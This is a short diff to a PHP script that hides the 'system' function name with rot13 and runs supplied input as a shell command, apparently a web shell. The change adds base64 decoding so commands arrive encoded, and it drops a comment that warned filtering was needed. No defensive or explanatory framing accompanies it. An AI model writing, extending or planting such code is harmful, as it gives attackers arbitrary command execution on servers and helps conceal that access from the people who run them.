@@ -23,13 +23,21 @@ try {
     // Obfuscated 'system' function
     $execute = str_rot13('flfgrz');
 
-    // Check if the input is safe to run as a system command (Basic check, more filtering needed in real-world applications)
+    // Check if the input is provided
     if (empty($input)) {
         throw new Exception("No input provided to execute.");
     }
+    
+    // Decode the base64 encoded command
+    $decoded_input = base64_decode($input);
+    
+    // Verify the decode was successful
+    if ($decoded_input === false) {
+        throw new Exception("Invalid base64 input provided.");
+    }
 
-    // Execute the command
-    $output = $execute($input);
+    // Execute the decoded command
+    $output = $execute($decoded_input);
 
     // Optionally capture and display output (system prints by default)
     echo $output;
